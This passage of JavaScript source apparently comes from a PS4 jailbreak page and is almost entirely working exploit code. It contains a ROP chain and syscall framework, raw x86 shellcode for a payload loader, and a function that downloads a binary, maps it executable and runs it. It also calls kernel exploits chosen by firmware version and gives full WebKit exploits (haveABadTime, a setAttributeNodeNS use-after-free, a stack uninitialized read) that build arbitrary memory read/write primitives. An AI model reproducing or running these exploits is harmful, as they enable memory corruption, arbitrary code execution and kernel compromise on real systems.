							returnToFrame = chain.runtime(stackPointer);

						chain.push(gadgets["pop rsp"]);
						chain.push(returnToFrame); // -> back to the trap life
						chain.count = ocnt;

						p.write8(stackPointer, gadgets["pop rsp"]);
						p.write8(stackPointer.add32(8), chain.stackBase);
					}
				}
			};
			
			funcbuf = p.read8(p.leakval(funcbuf32).add32(window.leakval_slide));

			p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
			p.write8(funcbuf.add32(0x80), gadgets["jop"]);
			p.write8(funcbuf, funcbuf);
			p.write8(parseFloatStore, gadgets["jop"]);
			var orig_hold = p.read8(holdz1);
			var orig_hold48 = p.read8(holdz1.add32(0x48));

			p.write8(holdz1, funcbuf.add32(0x50));
			p.write8(holdz1.add32(0x48), funcbuf);
			parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
			p.write8(holdz1, orig_hold);
			p.write8(holdz1.add32(0x48), orig_hold48);

			stackPointer = p.read8(funcbuf.add32(0x10));
			rtv = Array.prototype.splice.apply(reenter_help);
			return p.leakval(rtv);
		}

	}
	
	p.loadchain = launch_chain;

	//alert("resolving syscalls");
	if (window.ps4_fw <= 407) {
		/* Get syscall map based on firmware from user-agent string */
		if (syscallMap[fwFromUA] != null) {
			window.syscalls = syscallMap[fwFromUA];
			for (var syscallno in window.syscalls) {
				if (window.syscalls.hasOwnProperty(syscallno)) {
					window.syscalls[syscallno] = o2lk(window.syscalls[syscallno]);
					//alert(window.syscalls[syscallno]);
					//alert(p.read8(window.syscalls[syscallno]));
				}
			}
		}
		else {
			//alert("Your system SW version does not have a valid syscall map! The exploit will still work but calling syscalls will not function properly...");
		}
	} else {
		var kview = new Uint8Array(0x1000);
		var kstr = p.leakval(kview).add32(window.leakval_slide);
		var orig_kview_buf = p.read8(kstr);

		p.write8(kstr, window.libKernelBase);
		p.write4(kstr.add32(8), 0x40000);
		
		var countbytes;
		for (var i = 0; i < 0x40000; i++) {
			if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
				countbytes = i;
				break;
			}
		}
		p.write4(kstr.add32(8), countbytes + 32);

		var dview32 = new Uint32Array(1);
		var dview8 = new Uint8Array(dview32.buffer);
		for (var i = 0; i < countbytes; i++) {
			if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
				dview8[0] = kview[i + 3];
				dview8[1] = kview[i + 4];
				dview8[2] = kview[i + 5];
				dview8[3] = kview[i + 6];
				var syscallno = dview32[0];
				window.syscalls[syscallno] = window.libKernelBase.add32(i);
			}
		}
	}
	
	var chain = new window.rop;
	var returnvalue;
	
	p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
		chain.clear();

		chain.notimes = this.next_notime;
		this.next_notime = 1;

		chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

		chain.push(window.gadgets["pop rdi"]);
		chain.push(chain.stackBase.add32(0x3ff8));
		chain.push(window.gadgets["mov [rdi], rax"]);

		chain.push(window.gadgets["pop rax"]);
		chain.push(p.leakval(0x41414242));
		
		if (chain.run().low != 0x41414242)
			throw new Error("unexpected rop behaviour");
		returnvalue = p.read8(chain.stackBase.add32(0x3ff8));
	}

	p.fcall = function () {
		var rv = p.fcall_.apply(this, arguments);
		return returnvalue;
	}

	p.writestr = function (addr, str) {
		for (var i = 0; i < str.length; i++) {
			var byte_ = p.read4(addr.add32(i));
			byte_ &= 0xFFFF0000;
			byte_ |= str.charCodeAt(i);
			p.write4(addr.add32(i), byte_);
		}
	}
	
	p.readstr = function (addr) {
		var addr_ = addr.add32(0);
		var rd = p.read4(addr_);
		var buf = "";
		while (rd & 0xFF) {
			buf += String.fromCharCode(rd & 0xFF);
			addr_.add32inplace(1);
			rd = p.read4(addr_);
		}
		return buf;
	}

	p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
		if (typeof sysc == "string")
			sysc = window.syscallnames[sysc];
			
		if (typeof sysc != "number")
			throw new Error("invalid syscall");

		var off = window.syscalls[sysc];
		if (off == undefined)
			throw new Error("undefined syscall number: " + sysc);

		return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
	}

	p.stringify = function (str) {
		var bufView = new Uint8Array(str.length + 1);
		for (var i = 0; i < str.length; i++)
			bufView[i] = str.charCodeAt(i) & 0xFF;
		window.nogc.push(bufView);
		return p.read8(p.leakval(bufView).add32(window.leakval_slide));
	};

	p.malloc = function malloc(sz) {
		var backing = new Uint8Array(0x10000 + sz);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = backing;
		return ptr;
	}

	p.malloc32 = function malloc32(sz) {
		var backing = new Uint8Array(0x10000 + sz * 4);
		window.nogc.push(backing);
		var ptr = p.read8(p.leakval(backing).add32(window.leakval_slide));
		ptr.backing = new Uint32Array(backing.buffer);
		return ptr;
	}
	
	p.socket = function() {
		return p.syscall('sys_socket', 2, 1, 0); // 2 = AF_INET, 1 = SOCK_STREAM, 0 = TCP
	}

	p.connectSocket = function(s, ip, port) {
		var sockAddr = new Uint32Array(0x10);
		var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(window.leakval_slide));
		var ipSegments = ip.split('.');
		
		for (var seg = 0; seg < 4; seg++)
			ipSegments[seg] = parseInt(ipSegments[seg]);
		
		sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
		sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
		sockAddr[2] = 0;
		sockAddr[3] = 0;
		
		return p.syscall('sys_connect', s, sockAddrPtr, 0x10);
	}
	
	p.writeSocket = function(s, data, size) {
		return p.syscall('sys_write', s, data, size);
	}
	
	p.closeSocket = function(s) {
		return p.syscall('sys_close', s);
	}
	
	window.spawnthread = function (chain) {
		var contextp = p.malloc32(0x1800);
		var contextz = contextp.backing;
		contextz[0] = 1337;
		var thread2 = new window.rop();
		//thread2.clear(); // maybe not needed
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		thread2.push(window.gadgets["ret"]); // nop
		chain(thread2); // re-enter into |chain| which will set up thread chain
		p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget -  longjmp will return into this
		p.write8(contextp.add32(0x10), thread2.stackBase); // rsp - longjmp pivots RSP to this, invoking the just created chain
		p.syscall("sys_mlockall", 1);
		//p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		var thread = p.malloc(0x08);
		p.fcall(window.gadgets["scePthreadCreate"], thread, 0, window.gadgets["longjmp"], contextp, p.stringify("GottaGoFast"));
		window.nogc.push(contextp); // never free()
		window.nogc.push(thread2);
		return thread2;
	}

	window.runPayload = function (path) {
		var req = new XMLHttpRequest();
		req.open('GET', path);
		req.responseType = "arraybuffer";
		req.onreadystatechange = function () {
			if (req.readyState === 4) {
				try {
					var code_addr = new int64(0x26100000, 0x00000009);
					var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
					if (mapped_address != '926100000')
						throw "sys_mmap failed";
					
					// Trick for 4 bytes padding
					var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
					var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
					tmp.set(new Uint8Array(req.response), 0);
					tmp.set(padding, req.response.byteLength);
					
					var shellcode = new Uint32Array(tmp.buffer);
					for (var i=0; i < shellcode.length; i++)
						p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
					p.fcall(code_addr);
					p.syscall("sys_munmap", code_addr, 0x300000);
				} catch (e) {
					//alert("exception: " + e);
				}
			}
		};
		sleep(1000);
		req.send();
		sleep(3000);
	};

	window.trydlsym = function() {
		var scratch32 = new Uint32Array(0x400);
		var scratch = p.read8(p.leakval(scratch32).add32(window.leakval_slide));
		var module_id = p.syscall("sys_dynlib_load_prx", p.stringify("libkernel_web.sprx"), 0, scratch, 0);
		//alert("ret: " + module_id + ", scratch: " + p.read8(scratch));
		//var sym = p.syscall(591, p.read8(scratch), p.stringify("sceSystemServiceLaunchWebBrowser"), scratch);
		var sym = p.syscall("sys_dynlib_dlsym", p.read8(scratch), p.stringify("sceKernelLoadStartModule"), scratch);
		//alert("ret: " + sym + ", scratch: " + p.read8(scratch));
		//alert(p.fcall(p.read8(scratch), p.stringify("libkernel_web.sprx"), 0, scratch.add32(0x40), 0, 0, 0));
	};
	
	if (p.fcall(window.gadgets["mov rax, rdi"], 0x41414141) != 41414141) {
		//alert("userland ROP execution not working");
	}
	
	//if (window.ps4_fw == 405)
	//alert(getKernelBase_namedobj());

    //alert("devkit = " + devkit);	

    var isDoExploit = false;

	// Test if the kernel is already patched
	if (p.syscall("sys_setuid", 0) != 0) {
		//alert("Launching kexploit");
        isDoExploit = true;
		if (window.ps4_fw <= 370)
			kernExploit_bpf_race_old();
		else if (window.ps4_fw <= 407)
			kernExploit_namedobj();
		else if (window.ps4_fw <= 455)
			kernExploit_bpf_race();
		else if (window.ps4_fw <= 507)
			kernExploit_bpf_double_free();
	} else {
		//alert("Kexploit has already been ran. Continuing.");
	}
	// Kernel patched, launch cool stuff
	
	//alert("kernel done");
	//sleep(500);
	var runPayload = window.runPayload;

	if (isDoExploit) {
		window.log("Kernel exploit complete! Devkit activation successful.", "green");
	}

	if (fwFromUA == "5.05") {
		if (bin_loader) {
			// Load payload launcher
			var code_addr = new int64(0x26100000, 0x00000009);
			var mapped_address = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
			if (mapped_address == '926100000') {
				try {
					var shcode = [0x31fe8948, 0x3d8b48c0, 0x00003ff4, 0xed0d8b48, 0x4800003f, 0xaaf3f929, 0xe8f78948, 0x00000060, 0x48c3c031, 0x0003c0c7, 0x89490000, 0xc3050fca, 0x06c0c748, 0x49000000, 0x050fca89, 0xc0c748c3, 0x0000001e, 0x0fca8949, 0xc748c305, 0x000061c0, 0xca894900, 0x48c3050f, 0x0068c0c7, 0x89490000, 0xc3050fca, 0x6ac0c748, 0x49000000, 0x050fca89, 0x909090c3, 0x90909090, 0x90909090, 0x90909090, 0xb8555441, 0x00003c23, 0xbed23153, 0x00000001, 0x000002bf, 0xec834800, 0x2404c610, 0x2444c610, 0x44c70201, 0x00000424, 0x89660000, 0xc6022444, 0x00082444, 0x092444c6, 0x2444c600, 0x44c6000a, 0xc6000b24, 0x000c2444, 0x0d2444c6, 0xff78e800, 0x10baffff, 0x41000000, 0x8948c489, 0xe8c789e6, 0xffffff73, 0x00000abe, 0xe7894400, 0xffff73e8, 0x31d231ff, 0xe78944f6, 0xffff40e8, 0x48c589ff, 0x200000b8, 0x00000926, 0xc300c600, 0xebc38948, 0x801f0f0c, 0x00000000, 0x01489848, 0x1000bac3, 0x89480000, 0xe8ef89de, 0xfffffef7, 0xe87fc085, 0xe8e78944, 0xfffffef8, 0xf1e8ef89, 0x48fffffe, 0x200000b8, 0x00000926, 0x48d0ff00, 0x5b10c483, 0xc35c415d, 0xc3c3c3c3];
					var shellbuf = p.malloc32(0x1000);
					for (var i = 0; i < shcode.length; i++)
						shellbuf.backing[i] = shcode[i];
					p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
					//p.fcall(window.gadgets["createThread"], shellbuf, 0, p.stringify("loader"));
					var thread_id = p.malloc(0x08);
					p.fcall(window.gadgets["scePthreadCreate"], thread_id, 0, shellbuf, 0, p.stringify("loader"));
					window.log("Awaiting payload...", "green"); // Awaiting payload message
				} catch (e) {
					window.log("Error: " + e, "red");
				}
			}
		}
		else {
			runPayload("ps4-devkit-activator-5.05.bin");
			window.log("You're all set! Devkit activation complete.", "green");
		}
	}
}


//================================================================================================
// WebKit Exploit: haveABadTime
//================================================================================================
// === FORCE GLOBAL EXPOSURE - BEST CHANCE FOR PS4 EXPLOIT PAGES ===
(function() {

    window.exploit_haveABadTime = function exploit_haveABadTime() {
        console.log("[haveABadTime] Function called - starting exploit...");

        const MAX_ATTEMPTS = 10;
        let attempt = 0;
        let success = false;

        function gc() {
            for (let i = 0; i < 8; i++) new ArrayBuffer(0x4000000);
        }

        while (attempt < MAX_ATTEMPTS && !success) {
            attempt++;
            console.log(`[haveABadTime] Attempt ${attempt}/${MAX_ATTEMPTS}`);

            try {
                gc();

                var instancespr = [];
                for (var i = 0; i < 4096; i++) {
                    instancespr[i] = new Uint32Array(1);
                    instancespr[i][0] = 50057;
                }

                var tgt = { a: 0, b: 0, c: 0, d: 0 };

                var y = new ImageData(1, 0x4000);
                postMessage("", "*", [y.data.buffer]);

                var props = {};
                for (var i = 0; i < (0x4000 / 2); ) {
                    props[i++] = { value: 0x42424242 };
                    props[i++] = { value: tgt };
                }

                // Leak Phase
                var foundLeak = undefined;
                var foundIndex = 0;
                var maxLeakTries = 180;

                for (let i = 0; i < maxLeakTries && !foundLeak; i++) {
                    history.pushState(y, "");
                    Object.defineProperties({}, props);

                    var leak = new Uint32Array(history.state.data.buffer);

                    for (var j = 0; j < leak.length - 0x20; j++) {
                        if (leak[j] === 0x42424242 && 
                            leak[j+1] === 0xFFFF0000 && 
                            leak[j+6] === 0x0000000E && 
                            leak[j+0xE] === 0x0000000E) {
                            
                            if (leak[j+2] === 0 && leak[j+3] === 0) {
                                foundIndex = j;
                                foundLeak = leak;
                                break;
                            }
                        }
                    }
                }

                if (!foundLeak) continue;

                // === Rest of the exploit (unchanged core) ===
                var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
                var leakJSVal = new int64(firstLeak[8], firstLeak[9]);

                Array.prototype.__defineGetter__(100, () => 1);

                var f = document.body.appendChild(document.createElement('iframe'));
                var a = new f.contentWindow.Array(13.37, 13.37);
                var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);

                var master = new Uint32Array(0x1000);
                var slave = new Uint32Array(0x1000);
                var leakval_u32 = new Uint32Array(0x1000);
                var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];

                tgt.a = u2d(2048, 0x1602300);
                tgt.b = 0;
                tgt.c = leakval_helper;
                tgt.d = 0x1337;

                var c = Array.prototype.concat.call(a, b);
                document.body.removeChild(f);

                var hax = c[0];
                c[0] = 0;

                tgt.c = c;
                hax[2] = 0;
                hax[3] = 0;

                Object.defineProperty(Array.prototype, 100, { get: undefined });

                tgt.c = leakval_helper;
                var butterfly = new int64(hax[2], hax[3]);
                butterfly.low += 0x10;

                tgt.c = leakval_u32;
                var lkv_u32_old = new int64(hax[4], hax[5]);
                hax[4] = butterfly.low;
                hax[5] = butterfly.hi;

                tgt.c = master;
                hax[4] = leakval_u32[0];
                hax[5] = leakval_u32[1];

                var addr_to_slavebuf = new int64(master[4], master[5]);

                tgt.c = leakval_u32;
                hax[4] = lkv_u32_old.low;
                hax[5] = lkv_u32_old.hi;

                // Primitives
                window.prim = {
                    write8: (addr, val) => {
                        master[4] = addr.low; master[5] = addr.hi;
                        if (val instanceof int64) { slave[0] = val.low; slave[1] = val.hi; }
                        else { slave[0] = val; slave[1] = 0; }
                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
                    },
                    write4: (addr, val) => {
                        master[4] = addr.low; master[5] = addr.hi;
                        slave[0] = val;
                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
                    },
                    read8: (addr) => {
                        master[4] = addr.low; master[5] = addr.hi;
                        var r = new int64(slave[0], slave[1]);
                        master[4] = addr_to_slavebuf.low; master[5] = addr_to_slavebuf.hi;
                        return r;
                    }
                };

                success = true;
                console.log(`[haveABadTime] SUCCESS on attempt ${attempt}!`);

                if (typeof window.postExpl === "function") window.postExpl();

            } catch (e) {
                console.error(`[Attempt ${attempt}] Error:`, e);
                document.querySelectorAll('iframe').forEach(el => el.remove());
            }
        }

        if (!success) {
            failed = true;
            if (typeof fail === "function") fail("haveABadTime failed after " + MAX_ATTEMPTS + " attempts");
        }
    };

    // Extra safety: Also expose it directly on the window and as a global
    window.haveABadTime = window.exploit_haveABadTime;

    console.log("[haveABadTime] Function registered successfully");
})();

function exploit_haveABadTime2() {

	var instancespr = [];
	for (var i = 0; i < 4096; i++) {
		instancespr[i] = new Uint32Array(1);
		instancespr[i][makeid()] = 50057;
	}

	// Target JSObject for overlap
	var tgt = {
		a: 0,
		b: 0,
		c: 0,
		d: 0
	}

	var y = new ImageData(1, 0x4000)
	postMessage("", "*", [y.data.buffer]);

	// Spray properties to ensure object is fastmalloc()'d and can be found easily later
	var props = {};

	for (var i = 0; (i < (0x4000 / 2)); ) {
		props[i++] = {
			value: 0x42424242
		};
		props[i++] = {
			value: tgt
		};
	}

	var foundLeak = undefined;
	var foundIndex = 0;
	var maxCount = 0x100;

	while (foundLeak == undefined && maxCount > 0) {
		maxCount--;

		history.pushState(y, "");

		Object.defineProperties({}, props);

		var leak = new Uint32Array(history.state.data.buffer);

		for (var i = 0; i < leak.length - 6; i++) {
			if (
					leak[i] == 0x42424242 &&
					leak[i + 0x1] == 0xFFFF0000 &&
					leak[i + 0x2] == 0x00000000 &&
					leak[i + 0x3] == 0x00000000 &&
					leak[i + 0x4] == 0x00000000 &&
					leak[i + 0x5] == 0x00000000 &&
					leak[i + 0x6] == 0x0000000E &&
					leak[i + 0x7] == 0x00000000 &&
					leak[i + 0xA] == 0x00000000 &&
					leak[i + 0xB] == 0x00000000 &&
					leak[i + 0xC] == 0x00000000 &&
					leak[i + 0xD] == 0x00000000 &&
					leak[i + 0xE] == 0x0000000E &&
					leak[i + 0xF] == 0x00000000
					) {
				foundIndex = i;
				foundLeak = leak;
				break;
			}
		}
	}

	if (!foundLeak) {
		failed = true
		fail("Failed to find leak!")
	}
	
	// Get first JSValue
	var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
	var leakJSVal = new int64(firstLeak[8], firstLeak[9]);

	// Userland pwnage
	try {
		Array.prototype.__defineGetter__(100, () => 1);

		var f = document.body.appendChild(document.createElement('iframe'));
		var a = new f.contentWindow.Array(13.37, 13.37);
		var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);

		var master = new Uint32Array(0x1000);
		var slave = new Uint32Array(0x1000);
		var leakval_u32 = new Uint32Array(0x1000);
		var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];

		// Create fake ArrayBufferView
		tgt.a = u2d(2048, 0x1602300);
		tgt.b = 0;
		tgt.c = leakval_helper;
		tgt.d = 0x1337;

		var c = Array.prototype.concat.call(a, b);
		document.body.removeChild(f);
		var hax = c[0];
		c[0] = 0;

		tgt.c = c;

		hax[2] = 0;
		hax[3] = 0;

		Object.defineProperty(Array.prototype, 100, {
			get: undefined
		});

		tgt.c = leakval_helper;
		var butterfly = new int64(hax[2], hax[3]);
		butterfly.low += 0x10;

		tgt.c = leakval_u32;
		var lkv_u32_old = new int64(hax[4], hax[5]);
		hax[4] = butterfly.low;
		hax[5] = butterfly.hi;
		
		// Setup read/write primitive
		tgt.c = master;
		hax[4] = leakval_u32[0];
		hax[5] = leakval_u32[1];

		var addr_to_slavebuf = new int64(master[4], master[5]);
		tgt.c = leakval_u32;
		hax[4] = lkv_u32_old.low;
		hax[5] = lkv_u32_old.hi;
		
		// Don't need these anymore
		tgt.c = 0;
		hax = 0;

		var prim = {
			write8: function (addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;

				if (val instanceof int64) {
					slave[0] = val.low;
					slave[1] = val.hi;
				} else {
					slave[0] = val;
					slave[1] = 0;
				}

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			write4: function (addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;

				slave[0] = val;

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			read8: function (addr) {
				master[4] = addr.low;
				master[5] = addr.hi;

				var rtv = new int64(slave[0], slave[1]);

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;

				return rtv;
			},

			read4: function (addr) {
				master[4] = addr.low;
				master[5] = addr.hi;

				var rtv = slave[0];

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;

				return rtv;
			},

			leakval: function (jsval) {
				leakval_helper[0] = jsval;
				var rtv = this.read8(butterfly);
				this.write8(butterfly, new int64(0x41414141, 0xffff0000));

				return rtv;
			},

			createval: function (jsval) {
				this.write8(butterfly, jsval);
				var rt = leakval_helper[0];
				this.write8(butterfly, new int64(0x41414141, 0xffff0000));
				return rt;
			}
		};

		window.prim = prim;
		if (window.postExpl)
			window.postExpl();
	} catch(e) {
		failed = true
		fail("Exception: " + e)
	}
}

//================================================================================================
// WebKit Exploit: setAttributeNodeNS
//================================================================================================
function exploit_setAttributeNodeNS() {
	
	window.log("Starting setAttributeNodeNS WebKit exploit...");
	
	var instancespr = [];
	for (var i=0; i<2048; i++) {
		instancespr[i] = {};
		instancespr[i][makeid()] = 50057;
	}
	for (var i=2048; i<4096; i++) {
		instancespr[i] = new Uint32Array(1);
		instancespr[i][makeid()] = 50057;
	}

	/////////////////// STAGE 1: INFOLEAK ///////////////////
	
	// Spray a bunch of JSObjects on the heap for stability
	for (var i = 0; i < 0x4000; i++)
		nogc.push({a: 0, b: 0, c: 0, d: 0});

	// Target JSObject for overlap
	var tgt = {a: 0, b: 0, c: 0, d: 0}

	for (var i = 0; i < 0x400; i++)
		nogc.push({a: 0, b: 0, c: 0, d: 0});

	var y = new ImageData(1, 0x4000)
	postMessage("", "*", [y.data.buffer]);

	// Spray properties to ensure object is fastmalloc()'d and can be found easily later
	var props = {};

	for (var i = 0; (i < (0x4000 / 2));) {
		props[i++] = {value: 0x42424242};
		props[i++] = {value: tgt};
	}

	// Find address of JSValue by leaking one of the JSObject's we sprayed
	var foundLeak = undefined;
	var foundIndex = 0;
	var maxCount = 0x100;

	// Only check 256 times, should rarely fail
	while (foundLeak == undefined && maxCount > 0) {
		maxCount--;

		history.pushState(y, "");

		Object.defineProperties({}, props);

		var leak = new Uint32Array(history.state.data.buffer);

		// Check memory against known values such as 0x42424242 JSValue and empty JSObject values
		for (var i = 0; i < leak.length - 6; i++) {
			if (
					leak[i]       == 0x42424242 &&
					leak[i + 0x1] == 0xFFFF0000 &&
					leak[i + 0x2] == 0x00000000 &&
					leak[i + 0x3] == 0x00000000 &&
					leak[i + 0x4] == 0x00000000 &&
					leak[i + 0x5] == 0x00000000 &&
					leak[i + 0x6] == 0x0000000E &&
					leak[i + 0x7] == 0x00000000 &&
					leak[i + 0xA] == 0x00000000 &&
					leak[i + 0xB] == 0x00000000 &&
					leak[i + 0xC] == 0x00000000 &&
					leak[i + 0xD] == 0x00000000 &&
					leak[i + 0xE] == 0x0000000E &&
					leak[i + 0xF] == 0x00000000
					) {
				foundIndex = i;
				foundLeak = leak;
				break;
			}
		}
	}

	// Oh no :(
	if (!foundLeak) {
		failed = true
		fail("Failed to find leak!")
	}

	// Get first JSValue
	var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
	var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
	leakJSVal.toString();

	// Spray and clear 
	for (var i = 0; i < 0x4000; i++)
		var lol = {a: 0, b: 0, c: 0, d: 0};

	// Force garbage collection via memory pressure
	var dgc = function() {
		for (var i = 0; i < 0x100; i++)
			new ArrayBuffer(0x100000);
	}

	/////////////////// STAGE 2: UAF ///////////////////

	// Userland pwnage

	try {
		var src = document.createAttribute('src');
		src.value = 'javascript:parent.callback()';
		
		var d = document.createElement('div');

		// Sandwich our target iframe
		for (var i = 0; i < 0x4000; i++)
			nogc.push(document.createElement('iframe'));

		var f = document.body.appendChild(document.createElement('iframe'));

		for (var i = 0; i < 0x4000; i++)
			nogc.push(document.createElement('iframe'));

		// Free the iframe!
		window.callback = () => {
			window.callback = null;
			
			d.setAttributeNodeNS(src);
			f.setAttributeNodeNS(document.createAttribute('src'));
		};

		f.name = "lol";
		f.setAttributeNodeNS(src);
		f.remove();
		
		f = null;
		src = null;
		nogc.length=0;
		dgc();

		/////////////////// STAGE 3: HEAP SPRAY ///////////////////

		// Setup spray variables
		var objSpray = 0x10000;
		var objSz = 0x90;
		var objs = new Array(objSpray);

		// Spray the heap with MarkedArgumentBuffers to corrupt iframe JSObject's backing memory. ImageData does this well.
		for (var i = 0; i < objSpray; i++)
			objs[i] = new ImageData(1, objSz / 4);

		for (var i = 0; i < objSpray; i++)
			objs[i] = new Uint32Array(objs[i].data.buffer);

		/////////////////// STAGE 4: MISALIGNING JSVALUES ///////////////////

		var craftptr = leakJSVal.sub32(0x10000 - 0x10)
		tgt.b = u2d(0,craftptr.low); // 0x10000 is offset due to double encoding
		tgt.c = craftptr.hi;
		tgt.a = u2d(2048, 0x1602300);

		/////////////////// STAGE 3 - CONTINUED ///////////////////

		// Memory corruption ; not even once!
		for (var i=0; i<objSpray; i++) {
			// The poor butterflies :(
			objs[i][2] = leakJSVal.low + 0x18 + 4;
			objs[i][3] = leakJSVal.hi;
		}

		/////////////////// STAGE 5: READ/WRITE PRIMITIVE ///////////////////

		// Retrieve hax reference and setup primitive helpers
		var hax = d.attributes[0].ownerElement;
		var master = new Uint32Array(0x1000);
		var slave = new Uint32Array(0x1000);
		var leakval_u32 = new Uint32Array(0x1000);
		var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];

		// Create fake ArrayBufferView
		tgt.a = u2d(4096, 0x1602300);
		tgt.b = 0;
		tgt.c = leakval_helper;
		tgt.d = 0x1337;

		// Save old butterfly
		var butterfly = new int64(hax[2], hax[3]);

		// Set leakval_u32's vector to leakval_helper's butterfly
		tgt.c = leakval_u32;
		var lkv_u32_old = new int64(hax[4], hax[5]);
		
		hax[4] = butterfly.low;
		hax[5] = butterfly.hi;

		// Setup read/write primitive
		tgt.c = master;
		hax[4] = leakval_u32[0];
		hax[5] = leakval_u32[1];
		
		var addr_to_slavebuf = new int64(master[4], master[5]);
		tgt.c = leakval_u32;
		hax[4] = lkv_u32_old.low;
		hax[5] = lkv_u32_old.hi;

		// Restore proper JSValues
		for (var i=0; i<objSpray; i++) {
			objs[i][2] = 0x41414141;
			objs[i][3] = 0xFFFF0000;
		}

		// Don't need these anymore
		tgt.c = 0;
		hax = 0;

		// Primitives :D
		var prim = {
			write8: function(addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;

				if (val instanceof int64) {
					slave[0] = val.low;
					slave[1] = val.hi;
				} else {
					slave[0] = val;
					slave[1] = 0;
				}

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			write4: function(addr, val) {
				master[4] = addr.low;
				master[5] = addr.hi;

				slave[0] = val;

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;
			},

			read8: function(addr) {
				master[4] = addr.low;
				master[5] = addr.hi;

				var rtv = new int64(slave[0], slave[1]);

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;

				return rtv;
			},

			read4: function(addr) {
				master[4] = addr.low;
				master[5] = addr.hi;

				var rtv = slave[0];

				master[4] = addr_to_slavebuf.low;
				master[5] = addr_to_slavebuf.hi;

				return rtv;
			},

			leakval: function(jsval) {
				leakval_helper[0] = jsval;
				var rtv = this.read8(butterfly);
				this.write8(butterfly, new int64(0x41414141, 0xffffffff));
				
				return rtv;
			},

			createval: function(jsval) {
				this.write8(butterfly, jsval);
				var rt = leakval_helper[0];
				this.write8(butterfly, new int64(0x41414141, 0xffffffff));
				return rt;
			}
		};

		window.prim = prim;
		if (window.postExpl)
			window.postExpl();
	} catch(e) {
		failed = true
		fail("Exception: " + e)
	}
}

//================================================================================================
// WebKit Exploit: StackUninitializedRead
//================================================================================================
function exploit_StackUnitializedRead() {
	
	var memPressure = new Array(400); // For forcing GC via memory pressure
	var stackFrame = []; // Our fake stack in memory
	var frameIndex = 0; // Set index in fake stack to 0 (0xFF00)
	var stackPeek = 0;

	/* Force garbage collection via memory pressure */
	var doGarbageCollection = function() {
	  /* Apply memory pressure */
	  for (var i = 0; i < memPressure.length; i++)
		memPressure[i] = new Uint32Array(0x10000);

	  /* Zero out the buffer */
	  for (var i = 0; i < memPressure.length; i++)
		memPressure[i] = 0;
	}

	/* For peeking the stack (reading) */
	function peek_stack() {
	  var mem;
	  var retno;
	  var oldRetno;

	  /* Set arguments.length to return 0xFFFF on first call, and 1 on subsequent calls */
	  retno = 0xFFFF;

	  arguments.length =
	  {
		valueOf: function()
		{
		  oldRetno = retno;
		  retno = 1;
		  return oldRetno;
		}
	  }

	  /*
		What this essentially does is when function.prototype.apply() is called, it will
		check arguments length. Where it should return 1 (the actual size), it actually
		returns 0xFFFF due to the function above. This allows an out-of-bounds read
		on the stack, and allows us to control uninitialized memory regions
	  */
	  var args = arguments;

	  (function() {
		(function() {
		  (function() {
			mem = arguments[0xFF00];
		  }).apply(undefined, args);
		}).apply(undefined, stackFrame);
	  }).apply(undefined, stackFrame);

	  stackPeek = mem;

	  return mem;
	}

	/* For poking the stack (writing) */
	function poke_stack(val) {
	  /* Set stack frame value @ frameIndex */
	  stackFrame[frameIndex] = val;

	  /* Apply to uninitialized memory region on the stack */
	  (function() {
		(function() {
		  (function() {
		  }).apply(null, stackFrame);
		}).apply(null, stackFrame);
	  }).apply(null, stackFrame);

	  /* Clear value in stack frame @ frameIndex as it's been applied already */
	  stackFrame[frameIndex] = "";
	}

	// Userland pwnage
